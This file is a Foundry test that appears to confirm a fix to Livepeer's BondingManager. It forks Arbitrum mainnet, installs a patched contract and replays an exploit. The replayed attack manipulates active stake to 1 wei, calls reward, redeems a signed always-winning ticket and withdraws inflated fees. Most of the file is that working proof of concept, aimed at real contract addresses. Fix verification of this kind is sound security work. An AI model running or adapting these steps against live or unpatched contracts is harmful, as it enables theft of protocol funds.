pragma solidity ^0.8.9;

import { console } from "forge-std/console.sol";
import { GovernorBaseTest } from "./base/GovernorBaseTest.sol";

import "contracts/bonding/BondingManager.sol";
import "contracts/pm/TicketBroker.sol";
import "contracts/rounds/RoundsManager.sol";
import "contracts/token/LivepeerToken.sol";

// forge test --match-contract BondingManagerInflatedTicketFix --fork-url https://arbitrum-mainnet.infura.io/v3/$INFURA_KEY -vvv --fork-block-number 267164264
contract BondingManagerInflatedTicketFix is GovernorBaseTest {
    LivepeerToken lpt = LivepeerToken(0x289ba1701C2F088cf0faf8B3705246331cB8A839);
    BondingManager bm = BondingManager(0x35Bcf3c30594191d53231E4FF333E8A770453e40);
    TicketBroker tb = TicketBroker(0xa8bB618B1520E284046F3dFc448851A1Ff26e41B);
    RoundsManager rm = RoundsManager(0xdd6f56DcC28D3F5f27084381fE8Df634985cc39f);

    address constant MINTER = 0xc20DE37170B45774e6CD3d2304017fc962f27252;

    address TICKET_SENDER;
    uint256 TICKET_SENDER_KEY = 31337;

    bytes32 public constant BONDING_MANAGER_TARGET_ID = keccak256("BondingManagerTarget");
    BondingManager public newBondingManagerTarget;

    function setUp() public {
        newBondingManagerTarget = new BondingManager(address(CONTROLLER));

        (, gitCommitHash) = CONTROLLER.getContractInfo(BONDING_MANAGER_TARGET_ID);

        stageAndExecuteOne(
            address(CONTROLLER),
            0,
            abi.encodeWithSelector(
                CONTROLLER.setContractInfo.selector,
                BONDING_MANAGER_TARGET_ID,
                address(newBondingManagerTarget),
                gitCommitHash
            )
        );

        // Fund the attacker with 4010 LPT to main contract
        CHEATS.prank(MINTER);
        lpt.transfer(address(this), 4010 ether);
        // which in turn funds the second contract with 10 LPT
        lpt.transfer(address(0x1337), 10 ether);

        TICKET_SENDER = CHEATS.addr(TICKET_SENDER_KEY);
    }

    function test_poc() public {
        // Check start balance
        console.log("Start minter balance:", MINTER.balance, "wei");

        // Bond 4000 LPT from the attacker, enough to become an active transcoder in the forked block
        lpt.approve(address(bm), type(uint256).max);
        bm.bond(4000 ether, address(this));
        // Set reward and fee cut rate such that the transcoder gets all rewards but delegators get all fees
        bm.transcoder(1e6, 1e6);

        // Wait for the next round
        _nextRound();

        // Unbond all LPT except 1 wei, such that the transcoder becomes the last active transcoder wth 1 wei stake.
        bm.unbond(4000 ether - 1 wei);

        // Secondary attacker contract now bonds with the 10 LPT, kicking the main contract out of the active transcoders
        CHEATS.startPrank(address(0x1337));
        lpt.approve(address(bm), type(uint256).max);
        bm.bond(10 ether, address(0x1337));
        CHEATS.stopPrank();

        // Main attacker now calls reward in the last active round, which will increase the activeCumulativeRewards but not the total stake of the next round (because they're not active anymore)
        bm.reward();

        // Wait for the next round
        _nextRound();

        // Prepare a always-winning ticket of 1 ETH to the main attacker contract
        MTicketBrokerCore.Ticket memory ticket = MTicketBrokerCore.Ticket({
            recipient: address(this),
            sender: TICKET_SENDER,
            faceValue: 1 ether,
            winProb: type(uint256).max,
            senderNonce: 1,
            recipientRandHash: keccak256(abi.encodePacked(uint256(1337))),
            auxData: abi.encodePacked(rm.currentRound(), rm.blockHashForRound(rm.currentRound()))
        });

        // Sign it
        bytes32 ticketHash = keccak256(
            abi.encodePacked(
                ticket.recipient,
                ticket.sender,
                ticket.faceValue,
                ticket.winProb,
                ticket.senderNonce,
                ticket.recipientRandHash,
                ticket.auxData
            )
        );
        bytes32 signHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", ticketHash));
        (uint8 v, bytes32 r, bytes32 s) = CHEATS.sign(TICKET_SENDER_KEY, signHash);

        // Ticket sender needs to deposit the assets (they'll be stolen back later)
        payable(TICKET_SENDER).transfer(1 ether);
        CHEATS.prank(TICKET_SENDER);
        tb.fundDeposit{ value: 1 ether }();

        // Now redeeming the ticket will give 1 ETH in fees to the main attacker
        // which will be multiplied with a huge multiplier due to the stake being 1 wei and the
        // activeCumulativeRewards being much higher.
        tb.redeemWinningTicket(ticket, abi.encodePacked(r, s, v), 1337);

        // Convert to actual fees
        bm.claimEarnings(0);

        (, uint256 fees, , , , , ) = bm.getDelegator(address(this));
        // And withdraw the accrued fees
        bm.withdrawFees(payable(address(this)), fees);

        // gg wp
        console.log("Final minter balance:", MINTER.balance, "wei");
    }

    function _nextRound() private {
        CHEATS.roll(block.number + 6377);
        rm.initializeRound();
    }

    receive() external payable {}
}
